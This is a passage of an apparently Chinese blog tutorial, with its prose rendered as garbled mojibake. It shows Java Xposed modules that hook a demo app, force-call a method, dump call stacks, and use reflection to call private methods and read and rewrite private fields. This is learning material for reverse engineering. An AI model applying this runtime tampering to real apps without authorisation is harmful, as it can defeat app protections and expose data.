class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.d(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;qian&quot;</span>);</span><br><span class="line">                        XposedHelpers.callMethod(clazz.newInstance(),<span class="string">&quot;refl&quot;</span>);</span><br><span class="line">                        Log.d(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;hou&quot;</span>);</span><br><span class="line">                        <span class="type">int</span> aa=XposedHelpers.getIntField(param.thisObject,<span class="string">&quot;innerPublicInt&quot;</span>);</span><br><span class="line">                        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;&quot;</span>+aa);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä»£ç æ˜¯åœ¨â€œHookå†…éƒ¨ç±»â€åŸºç¡€ä¸Šå†™çš„ã€‚ä¸»åŠ¨è°ƒç”¨å°±æ˜¯è°ƒç”¨ä¸€ä¸ªappæœ¬èº«ä¸ä¼šæ‰§è¡Œçš„æ–¹æ³•ï¼Œä½ ä¸»åŠ¨è®©ä»–æ‰§è¡Œã€‚</p><p>è¯´ä¸€ä¸‹è¿™ä¸ªä»£ç çš„å˜åŒ–ä¹‹å¤„ã€‚å› ä¸ºè°ƒç”¨æ–¹æ³•å®ä¾‹ï¼Œè‚¯å®šè¦æœ‰å¯¹è±¡</p><ul><li>clazz.newInstance()ï¼šåŠ¨æ€åˆ›å»ºç±»çš„æ–°å¯¹è±¡</li><li>XposedHelpers.callMethod(Object obj, String methodName, Objectâ€¦ args):è°ƒç”¨æ–¹æ³•</li></ul><h3 id="æ‰§è¡Œç»“æœ-8">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230715221315133.png" alt="image-20230715221315133"></p><h2 id="ä¹-æ‰“å°å‡½æ•°è°ƒç”¨æ ˆ">ä¹.æ‰“å°å‡½æ•°è°ƒç”¨æ ˆ</h2><h3 id="ç›®æ ‡ï¼šæ‰“å°å‡½æ•°è°ƒç”¨æ ˆï¼Œå‚çœ‹è°è°ƒç”¨äº†innerFuncæ–¹æ³•">ç›®æ ‡ï¼šæ‰“å°å‡½æ•°è°ƒç”¨æ ˆï¼Œå‚çœ‹è°è°ƒç”¨äº†innerFuncæ–¹æ³•</h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹ï¼š">ä»£ç å®ç°å¦‚ä¸‹ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.e(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;Stack:&quot;</span>,<span class="keyword">new</span> <span class="title class_">Throwable</span>(<span class="string">&quot;Stack dump&quot;</span>));</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“å°å‡½æ•°è°ƒç”¨æ ˆä¸€èˆ¬ç”¨Log.eï¼Œè¿™é‡Œå°±æ˜¯å†findAndHookMethodæ–¹æ³•&quot;innerFunc&quot;æ—¶æŸ¥çœ‹è°ƒç”¨æ ˆï¼Œçœ‹è°è°ƒç”¨äº†&quot;innerFunc&quot;æ–¹æ³•</p><ul><li>new Throwable()ï¼šæŠ›å‡ºé”™è¯¯ï¼ŒæŸ¥çœ‹æ ˆä¿¡æ¯</li></ul><h3 id="æ‰§è¡Œç»“æœ-9">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230716152534518.png" alt="image-20230716152534518"></p><p>testè°ƒç”¨äº†&quot;innerFunc&quot;æ–¹æ³•ã€‚</p><p><strong>æ–¹æ³•äºŒï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">PrintStack</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Dump Stack: &quot;</span>+ <span class="string">&quot;---------------start----------------&quot;</span>);</span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Throwable</span>();</span><br><span class="line">        StackTraceElement[] stackElements = ex.getStackTrace();</span><br><span class="line">        <span class="keyword">if</span> (stackElements != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; stackElements.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">                XposedBridge.log(<span class="string">&quot;Dump Stack&quot;</span>+i+<span class="string">&quot;: &quot;</span>+ stackElements[i].getClassName()</span><br><span class="line">                        +<span class="string">&quot;----&quot;</span>+stackElements[i].getFileName()</span><br><span class="line">                        +<span class="string">&quot;----&quot;</span> + stackElements[i].getLineNumber()</span><br><span class="line">                        +<span class="string">&quot;----&quot;</span> +stackElements[i].getMethodName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Dump Stack: &quot;</span>+ <span class="string">&quot;---------------over----------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;&lt;Start dump Stack !&gt;&quot;</span>);</span><br><span class="line">        e.fillInStackTrace();</span><br><span class="line">        Log.i(<span class="string">&quot;&lt;Dump Stack&gt;:&quot;</span>, <span class="string">&quot;++++++++++++&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="å-Javaåå°„å¤§æ³•-è·å–æ–¹æ³•">å.Javaåå°„å¤§æ³•(è·å–æ–¹æ³•)</h2><h3 id="ç›®æ ‡ï¼šè·å¾—privateæ–¹æ³•image-20230716154434826">ç›®æ ‡ï¼šè·å¾—privateæ–¹æ³•<img src="/posts/947764cb.htm/image-20230716154434826.png" alt="image-20230716154434826"></h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹-9">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                       Class democlazz=Class.forName(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,<span class="literal">false</span>,loadPackageParam.classLoader);</span><br><span class="line">                        Method  reflmethod=democlazz.getDeclaredMethod(<span class="string">&quot;refl&quot;</span>);</span><br><span class="line">                        reflmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        reflmethod.invoke(clazz.newInstance());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¥éª¤ï¼š</p><ol><li>æ‰¾åˆ°ç±»</li><li>æ‰¾åˆ°å­—æ®µæˆ–æ–¹æ³• è®¾å®šè®¿é—®æƒé™</li><li>ä¿®æ”¹å­—æ®µæˆ–è°ƒç”¨æ–¹æ³•</li></ol><ul><li>Class.forName(â€œåŒ…+ç±»â€,false,loadPackageParam.classLoader):åŠ è½½reflæ–¹æ³•æ‰€åœ¨çš„ç±»ã€‚</li><li>getDeclaredMethod(â€œæ–¹æ³•åâ€,â€œå‚æ•°â€):è·å–æ–¹æ³•ï¼ŒgetDeclaredMethodå¯ä»¥è·å–privateæ–¹æ³•ï¼ŒgetMethodä¸å¯ä»¥è·å–privateæ–¹æ³•</li><li>setAccessible(true/false)ï¼šè®¾ç½®è®¿é—®æƒé™ï¼Œprivate</li><li>invoke(Object obj, Objectâ€¦ args)ï¼šè°ƒç”¨æ–¹æ³•</li><li>xxx.getType()ï¼šè·å–å­—æ®µç±»å‹</li><li>xxx.getName()ï¼šè·å–å­—æ®µåå­—</li><li>xxx.getModifiers()ï¼šè·å–è®¿é—®ä¿®é¥°ç¬¦</li></ul><h3 id="æ‰§è¡Œç»“æœï¼š">æ‰§è¡Œç»“æœï¼š</h3><p>è¿è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230716173137994.png" alt="image-20230716173137994"></p><h2 id="åä¸€-åå°„å¤§æ³•-è·å–å±æ€§">åä¸€.åå°„å¤§æ³•(è·å–å±æ€§)</h2><h3 id="ç›®æ ‡ï¼šè·å¾—privateå­—æ®µå¹¶è®¾ç½®image-20230716180947881">ç›®æ ‡ï¼šè·å¾—privateå­—æ®µå¹¶è®¾ç½®<img src="/posts/947764cb.htm/image-20230716180947881.png" alt="image-20230716180947881"></h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹-10">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                       Class democlazz=Class.forName(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,<span class="literal">false</span>,loadPackageParam.classLoader);</span><br><span class="line">                       Field reffield=democlazz.getDeclaredField(<span class="string">&quot;reflect&quot;</span>);</span><br><span class="line">                       Object obj=clazz.newInstance();</span><br><span class="line">                       reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                       String str=(String)reffield.get(obj);</span><br><span class="line">                       Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;è¿™æ˜¯åå°„è·å–çš„å­—æ®µ &quot;</span>+ str);</span><br><span class="line">                       reffield.set(obj,<span class="string">&quot;fanshedafa&quot;</span>);</span><br><span class="line">                       str=(String)reffield.get(obj);</span><br><span class="line">                        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;è¿™æ˜¯åå°„è®¾ç½®çš„å­—æ®µ &quot;</span>+ str);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>getDeclaredField(String name)ï¼šè·å–å±æ€§ï¼Œå’ŒgetFieldåŒºåˆ«å¦‚ä¸Šé¢çš„getDeclaredMethodä¸€æ ·ã€‚</li><li>setAccessible(true/false)ï¼šè®¾ç½®è®¿é—®æƒé™ï¼Œprivate</li><li>get(Object obj)ï¼šè·å–objå¯¹è±¡çš„å¯¹åº”å±æ€§çš„å€¼</li><li>set(Object objï¼ŒObject value)ï¼šè®¾ç½®objå¯¹è±¡çš„å¯¹åº”å±æ€§çš„å€¼</li></ul><h3 id="æ‰§è¡Œç»“æœ-10">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230716182556152.png" alt="image-20230716182556152"></p><p>ç¡®å®å€¼è¢«æ”¹å˜</p><h2 id="åäºŒ-éå†æ‰€æœ‰æ–¹æ³•å’Œå­—æ®µ">åäºŒ.éå†æ‰€æœ‰æ–¹æ³•å’Œå­—æ®µ</h2><h3 id="ç›®æ ‡ï¼šéå†æ‰€æœ‰æ–¹æ³•å’Œå­—æ®µ">ç›®æ ‡ï¼šéå†æ‰€æœ‰æ–¹æ³•å’Œå­—æ®µ</h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹-11">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        Method[] md=clazz.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;md.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,md[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] fd=clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;fd.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,fd[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 